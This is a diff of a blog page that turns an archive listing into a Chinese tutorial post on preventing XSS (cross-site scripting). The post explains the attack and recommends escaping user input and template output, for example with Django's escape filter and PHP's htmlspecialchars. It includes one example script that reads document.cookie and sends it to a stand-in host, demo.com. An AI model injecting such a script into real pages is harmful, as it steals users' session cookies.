@@ -109,21 +109,25 @@
 
 
 
-  <meta name="keywords" content="python Linux Django Flask Docker Spider">
-<meta property="og:type" content="website">
-<meta property="og:title" content="LeiJun&#39;s Blog">
-<meta property="og:url" content="http://www.leijunblog.com/archives/2016/index.html">
+  <meta name="description" content="什么是XSS?XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。  XSS如何攻击?其原理是攻击者往 web 页面里插入恶意的脚本代码（CSS代码、JavaScript代码等），当用户浏览该页面时，嵌入其中的脚本代码会被执行，从而达到恶意攻击用户的目的。如盗取用户cookie，破坏页面结构、重定向到其他网站等。 举个列子: ​">
+<meta name="keywords" content="如何预防XSS攻击?">
+<meta property="og:type" content="article">
+<meta property="og:title" content="如何预防XSS攻击?">
+<meta property="og:url" content="http://www.leijunblog.com/2016/01/06/如何预防XSS攻击/index.html">
 <meta property="og:site_name" content="LeiJun&#39;s Blog">
+<meta property="og:description" content="什么是XSS?XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。  XSS如何攻击?其原理是攻击者往 web 页面里插入恶意的脚本代码（CSS代码、JavaScript代码等），当用户浏览该页面时，嵌入其中的脚本代码会被执行，从而达到恶意攻击用户的目的。如盗取用户cookie，破坏页面结构、重定向到其他网站等。 举个列子: ​">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-09-08T01:53:43.308Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="LeiJun&#39;s Blog">
+<meta name="twitter:title" content="如何预防XSS攻击?">
+<meta name="twitter:description" content="什么是XSS?XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。  XSS如何攻击?其原理是攻击者往 web 页面里插入恶意的脚本代码（CSS代码、JavaScript代码等），当用户浏览该页面时，嵌入其中的脚本代码会被执行，从而达到恶意攻击用户的目的。如盗取用户cookie，破坏页面结构、重定向到其他网站等。 举个列子: ​">
 
 
 
 
 
 
-  <link rel="canonical" href="http://www.leijunblog.com/archives/2016/"/>
+  <link rel="canonical" href="http://www.leijunblog.com/2016/01/06/如何预防XSS攻击/"/>
 
 
 
@@ -133,7 +137,7 @@
   };
 </script>
 
-  <title>Archiv | LeiJun's Blog</title>
+  <title>如何预防XSS攻击? | LeiJun's Blog</title>
   
 
 
@@ -180,7 +184,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 	
 	<a href="https://github.com/JerryLei-leijun"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_darkblue_121621.png" alt="Fork me on GitHub"></a>
@@ -256,7 +260,7 @@
         
         
           
-          <li class="menu-item menu-item-archives menu-item-active">
+          <li class="menu-item menu-item-archives">
     <a href="/archives/" rel="section">
       <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
   </li>
@@ -320,28 +324,6 @@
           
             
 
-    
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-    
-
-  
-
-
 
 <!-- 新增访客统计代码 -->
 
@@ -369,191 +351,232 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-      
-      <span class="archive-page-counter">
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.leijunblog.com/2016/01/06/如何预防XSS攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jerry Lei">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/leijun.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LeiJun's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
+          <h1 class="post-title" itemprop="name headline">如何预防XSS攻击?
+              
+            
+          </h1>
         
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2016-01-06 00:00:00" itemprop="dateCreated datePublished" datetime="2016-01-06T00:00:00+08:00">2016-01-06</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2018-09-08 09:53:43" itemprop="dateModified" datetime="2018-09-08T09:53:43+08:00">2018-09-08</time>
+              
+            
+          </span>
+
           
-        
-        Öhm..! Insgesamt 7 Artikel. Bleib dran.
-      </span>
-      
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/network-security/" itemprop="url" rel="index"><span itemprop="name">network security</span></a></span>
 
-      
-
-        
-        
-        
-
-        
+                
+                
+              
+            </span>
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2016">2016</h1>
-          </div>
-        
-        
 
-        
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2016/01/06/如何预防XSS攻击/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count fb-comments-count" data-href="http://www.leijunblog.com/2016/01/06/如何预防XSS攻击/" itemprop="commentCount">0</span>
+                </a>
+              </span>
+            
+          
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2016/12/08/CSRF攻击与防御/" itemprop="url">
-              
-                <span itemprop="name">CSRF攻击与防御</span>
-              
-            </a>
-        
-      </h2>
+          
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2016-12-08T00:00:00+08:00"
-              content="2016-12-08" >
-          12-08
-        </time>
-      </div>
+          
 
-    </header>
-  </article>
+          
 
+        </div>
+      </header>
+    
 
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2016/06/13/Celery的简单安装与应用/" itemprop="url">
-              
-                <span itemprop="name">celery的简单安装及应用</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2016-06-13T00:00:00+08:00"
-              content="2016-06-13" >
-          06-13
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2016/01/06/SQL注入攻击/" itemprop="url">
-              
-                <span itemprop="name">SQL注入攻击</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2016-01-06T00:00:00+08:00"
-              content="2016-01-06" >
-          01-06
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2016/01/06/如何预防XSS攻击/" itemprop="url">
-              
-                <span itemprop="name">如何预防XSS攻击?</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2016-01-06T00:00:00+08:00"
-              content="2016-01-06" >
-          01-06
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
-
+        <h4 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS?"></a>什么是XSS?</h4><p>XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。 </p>
+<h4 id="XSS如何攻击"><a href="#XSS如何攻击" class="headerlink" title="XSS如何攻击?"></a>XSS如何攻击?</h4><p>其原理是攻击者往 web 页面里插入恶意的脚本代码（CSS代码、JavaScript代码等），当用户浏览该页面时，嵌入其中的脚本代码会被执行，从而达到恶意攻击用户的目的。如盗取用户cookie，破坏页面结构、重定向到其他网站等。 举个列子:</p>
+<p>​                     有一个web页面,内含表单共用户发表文章(如博客网站),假如我是一个攻击者,我会在内容中添加一些攻击代码,比如盗取其他用户cookie信息:</p>
+<p>This is a XSS test!</p>
+<p><script><br>var cookie = document.cookie;<br>window.open(“<a href="http://demo.com/getCookie.php?param=&quot;+cookie">http://demo.com/getCookie.php?param=&quot;+cookie</a>)<br>&lt;/script</p>
+<p>如果该网页管理者没有对我提交的表单内容做任何过滤处理,当其他用户查看我的内容时,,其他用户的cookie信息就会发送至我的<a href="http://demo.com站点,被我盗取。">http://demo.com站点,被我盗取。</a></p>
+<h4 id="如何预防"><a href="#如何预防" class="headerlink" title="如何预防?"></a>如何预防?</h4><p>要想防范攻击我们就需要对用户提交的表单内容进行过滤,有时数据库也有可能被攻击,这时就需要对模板中的输出数据也进行过滤,所以总结起来一般就这两种常见方法:</p>
+<ul>
+<li><p>对用户输入的数据进行过滤。</p>
+</li>
+<li><p>对视图模板中输出的数据进行过滤。</p>
+<p>过滤其实就是将用户提交的代码中的一些特殊字符转化为html实体,比如将上面代码中的&amp; , &lt; , &gt;等字符转换,代码就变成如下样子:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;b&amp;gt;This <span class="keyword">is</span> a XSS test!&amp;lt;/b&amp;gt;</span><br><span class="line">&amp;lt;script&amp;gt;</span><br><span class="line">var cookie = document.cookie;</span><br><span class="line">window.open(&amp;quot;http://demo.com/getCookie.php?param=&amp;quot;+cookie);</span><br><span class="line">&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure>
+<p>这样代码基本就无法执行了,举例:</p>
+</li>
+<li><p>python的django中一般使用escape过滤器对单一变量进行转义过滤,或者使用django的html文档自动转义。</p>
+</li>
+<li><p>在 PHP 中，可以使用 htmlspecialchars 或 htmlentities 函数对用户提交的表单数据进行过滤。</p>
+</li>
+</ul>
+</script></p>
+      
     </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/如何预防XSS攻击/" rel="tag"># 如何预防XSS攻击?</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/08/11/点击劫持攻击/" rel="next" title="点击劫持攻击">
+                <i class="fa fa-chevron-left"></i> 点击劫持攻击
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/01/06/SQL注入攻击/" rel="prev" title="SQL注入攻击">
+                SQL注入攻击 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+  </div>
 
 
           </div>
           
+
+  
+
+
 
         </div>
         
@@ -574,8 +597,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -678,6 +710,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#什么是XSS"><span class="nav-number">1.</span> <span class="nav-text">什么是XSS?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS如何攻击"><span class="nav-number">2.</span> <span class="nav-text">XSS如何攻击?</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -824,6 +872,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
 
   
 
